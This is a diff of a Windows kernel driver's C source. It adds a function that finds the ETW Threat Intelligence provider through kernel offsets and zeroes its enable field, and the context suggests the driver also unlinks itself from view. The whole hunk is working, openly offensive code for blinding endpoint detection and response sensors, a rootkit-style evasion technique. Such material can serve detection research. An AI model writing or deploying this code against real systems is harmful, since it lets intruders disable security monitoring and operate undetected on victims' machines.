@@ -688,6 +688,30 @@ NTSTATUS unlinkDriver(PDRIVER_OBJECT DriverObject) {
 	return STATUS_SUCCESS;
 }
 
+NTSTATUS disablingWTI(ULONG64 kernelBase, disKerETWArgs args) {
+    NTSTATUS status = STATUS_UNSUCCESSFUL;
+    DWORD64 etwtiProvReghandle = (DWORD64)kernelBase + args.etWThreatIntProvRegHandleOffset;
+
+    DWORD64 ETWTI_ETW_REG_ENTRY = *(DWORD64*)etwtiProvReghandle + args.regEntry_guidEntryOffset;
+
+    DWORD64 providerEnableInfoAddress = *(DWORD64*)ETWTI_ETW_REG_ENTRY + args.GuidEntry_ProviderEnableInfoOffset;
+
+    DbgPrintEx(0, 0, "[+] ETWTI ProviderEnableInfo address = 0x%llx\n", providerEnableInfoAddress);
+
+
+    DbgPrintEx(0, 0, "[+] ETWTI ProviderEnableInfo Value = 0x%llx\n", *(DWORD64*)providerEnableInfoAddress & 0xFF);
+
+    DbgPrintEx(0, 0, "[+] Disabling ETWTI Provider:\n");
+    *(DWORD64*)providerEnableInfoAddress = 0;
+
+    DbgPrintEx(0, 0, "[+] ETWTI ProviderEnableInfo Value = 0x%llx\n", *(DWORD64*)providerEnableInfoAddress & 0xFF);
+    if (*(DWORD64*)providerEnableInfoAddress == 0) {
+        status = STATUS_SUCCESS;
+    }
+
+    return status;
+}
+
 UINT64 FindKernelBase() {
     UNICODE_STRING functionName;
     PFN_ZwQuerySystemInformation querySysInfo;
